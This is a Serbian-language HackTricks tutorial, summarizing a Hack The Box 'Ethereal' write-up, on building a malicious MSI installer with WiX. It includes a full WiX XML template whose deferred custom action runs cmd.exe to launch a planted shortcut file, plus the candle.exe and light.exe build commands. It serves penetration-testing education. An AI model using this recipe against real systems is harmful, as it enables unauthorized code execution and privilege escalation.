{{#include ../../banners/hacktricks-training.md}}

# Kreiranje zlonamernog MSI i dobijanje root pristupa

Kreiranje MSI instalatera će se obaviti korišćenjem wixtools, posebno će se koristiti [wixtools](http://wixtoolset.org). Vredno je napomenuti da su pokušani alternativni MSI builderi, ali nisu bili uspešni u ovom konkretnom slučaju.

Za sveobuhvatno razumevanje primera korišćenja wix MSI, preporučuje se da se konsultuje [ova stranica](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Ovde možete pronaći razne primere koji demonstriraju korišćenje wix MSI.

Cilj je generisati MSI koji će izvršiti lnk datoteku. Da bi se to postiglo, može se koristiti sledeći XML kod ([xml odavde](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Važno je napomenuti da element Package sadrži atribute kao što su InstallerVersion i Compressed, koji specificiraju verziju instalatera i označavaju da li je paket komprimovan ili ne, respektivno.

Proces kreiranja uključuje korišćenje candle.exe, alata iz wixtools, za generisanje wixobject-a iz msi.xml. Sledeća komanda treba da se izvrši:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Pored toga, vredi napomenuti da je u postu priložena slika koja prikazuje komandu i njen izlaz. Možete se osloniti na nju za vizuelno vođenje.

Takođe, light.exe, još jedan alat iz wixtools, biće korišćen za kreiranje MSI datoteke iz wixobject-a. Komanda koja će biti izvršena je sledeća:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Slično prethodnoj komandi, slika je uključena u post koja ilustruje komandu i njen izlaz.

Imajte na umu da, iako ovaj sažetak ima za cilj da pruži vredne informacije, preporučuje se da se konsultujete sa originalnim postom za sveobuhvatnije detalje i tačne instrukcije.

## References

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
